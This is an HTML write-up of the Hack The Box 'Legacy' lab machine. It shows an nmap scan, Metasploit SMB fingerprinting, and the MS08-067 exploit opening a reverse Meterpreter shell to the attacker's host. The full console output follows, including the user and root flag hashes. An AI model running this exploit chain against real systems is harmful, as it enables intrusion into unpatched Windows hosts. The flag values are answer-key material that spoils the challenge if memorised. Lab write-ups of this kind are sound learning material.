@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Legacy Write-Up</title>
+        
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+        
+        <style>
+.task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }
+</style>
+        <style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        
+        
+    </head>
+    <body class="vscode-light">
+        <h1 id="legacy-write-up">Legacy Write-Up</h1>
+<p>Machine IP - 10.10.10.4</p>
+<h3 id="initial-phase">Initial Phase</h3>
+<p>Starting with an nmap scan, we see the following ports open. An aggressive background scan also reveals the same ports.</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/legacy# nmap -F 10.10.10.4
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-12 12:24 +04
+Nmap scan report for 10.10.10.4
+Host is up (0.21s latency).
+Not shown: 97 filtered ports
+PORT     STATE  SERVICE
+139/tcp  open   netbios-ssn
+445/tcp  open   microsoft-ds
+3389/tcp closed ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 4.91 seconds
+</div></code></code></pre>
+<p>There seems to be no other vector other than SMB to exploit here. Therefore, trying a little recon using metasploit -</p>
+<pre><code><code><div>msf5 &gt; use auxiliary/scanner/smb/smb_version
+msf5 auxiliary(scanner/smb/smb_version) &gt; set RHOST 10.10.10.4
+RHOST =&gt; 10.10.10.4
+msf5 auxiliary(scanner/smb/smb_version) &gt; run
+
+[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB )
+[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</div></code></code></pre>
+<p>This gives us the OS as Windows XP SP3. Therefore, googling along the line of 'Windows xp sp3 smb exploit', we get a CVE from the raid7 website which also has a metsploit module.</p>
+<h3 id="exploit-phase">Exploit Phase</h3>
+<p>Using the exploit from the rapid7 website, we get the shell as administrator -</p>
+<pre><code class="language-msf5"><code><div>msf5 exploit(windows/smb/ms08_067_netapi) &gt; show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf5 exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 10.10.10.4
+RHOST =&gt; 10.10.10.4
+msf5 exploit(windows/smb/ms08_067_netapi) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.68:4444
+[*] 10.10.10.4:445 - Automatically detecting the target...
+[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (179779 bytes) to 10.10.10.4
+[*] Meterpreter session 1 opened (10.10.14.68:4444 -&gt; 10.10.10.4:1028) at 2019-04-12 12:38:09 +0400
+
+meterpreter &gt; shell
+Process 1532 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32&gt;cd ..
+cd ..
+
+C:\WINDOWS&gt;cd ..
+cd ..
+
+C:\&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\
+
+16/03/2017  08:30 ��                 0 AUTOEXEC.BAT
+16/03/2017  08:30 ��                 0 CONFIG.SYS
+16/03/2017  09:07 ��    &lt;DIR&gt;          Documents and Settings
+16/03/2017  08:33 ��    &lt;DIR&gt;          Program Files
+12/04/2019  08:28 ��    &lt;DIR&gt;          WINDOWS
+               2 File(s)              0 bytes
+               3 Dir(s)   6.477.336.576 bytes free
+
+C:\&gt;cd &quot;Documents and Settings&quot;
+cd &quot;Documents and Settings&quot;
+
+C:\Documents and Settings&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\Documents and Settings
+
+16/03/2017  09:07 ��    &lt;DIR&gt;          .
+16/03/2017  09:07 ��    &lt;DIR&gt;          ..
+16/03/2017  09:07 ��    &lt;DIR&gt;          Administrator
+16/03/2017  08:29 ��    &lt;DIR&gt;          All Users
+16/03/2017  08:33 ��    &lt;DIR&gt;          john
+               0 File(s)              0 bytes
+               5 Dir(s)   6.477.336.576 bytes free
+
+C:\Documents and Settings&gt;cd john
+cd john
+
+C:\Documents and Settings\john&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\Documents and Settings\john
+
+16/03/2017  08:33 ��    &lt;DIR&gt;          .
+16/03/2017  08:33 ��    &lt;DIR&gt;          ..
+16/03/2017  09:19 ��    &lt;DIR&gt;          Desktop
+16/03/2017  08:33 ��    &lt;DIR&gt;          Favorites
+16/03/2017  08:33 ��    &lt;DIR&gt;          My Documents
+16/03/2017  08:20 ��    &lt;DIR&gt;          Start Menu
+               0 File(s)              0 bytes
+               6 Dir(s)   6.477.336.576 bytes free
+
+C:\Documents and Settings\john&gt;cd Desktop
+cd Desktop
+
+C:\Documents and Settings\john\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\Documents and Settings\john\Desktop
+
+16/03/2017  09:19 ��    &lt;DIR&gt;          .
+16/03/2017  09:19 ��    &lt;DIR&gt;          ..
+16/03/2017  09:19 ��                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)   6.477.336.576 bytes free
+
+C:\Documents and Settings\john\Desktop&gt;type user.txt
+type user.txt
+e69af0e4f443de7e36876fda4ec7644f
+C:\Documents and Settings\john\Desktop&gt;cd ../..
+cd ../..
+
+C:\Documents and Settings&gt;cd Administrator
+cd Administrator
+
+C:\Documents and Settings\Administrator&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\Documents and Settings\Administrator
+
+16/03/2017  09:07 ��    &lt;DIR&gt;          .
+16/03/2017  09:07 ��    &lt;DIR&gt;          ..
+16/03/2017  09:18 ��    &lt;DIR&gt;          Desktop
+16/03/2017  09:07 ��    &lt;DIR&gt;          Favorites
+16/03/2017  09:07 ��    &lt;DIR&gt;          My Documents
+16/03/2017  08:20 ��    &lt;DIR&gt;          Start Menu
+               0 File(s)              0 bytes
+               6 Dir(s)   6.477.336.576 bytes free
+
+C:\Documents and Settings\Administrator&gt;cd Desktop
+cd Desktop
+
+C:\Documents and Settings\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\Documents and Settings\Administrator\Desktop
+
+16/03/2017  09:18 ��    &lt;DIR&gt;          .
+16/03/2017  09:18 ��    &lt;DIR&gt;          ..
+16/03/2017  09:18 ��                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)   6.477.336.576 bytes free
+
+C:\Documents and Settings\Administrator\Desktop&gt;type root.tct
+type root.tct
+The system cannot find the file specified.
+
+C:\Documents and Settings\Administrator\Desktop&gt;type root.txt
+type root.txt
+993442d258b0e0ec917cae9e695d5713
+</div></code></code></pre>
+<p>Thus we get both the root and user flags.</p>
+
+    </body>
+    </html>
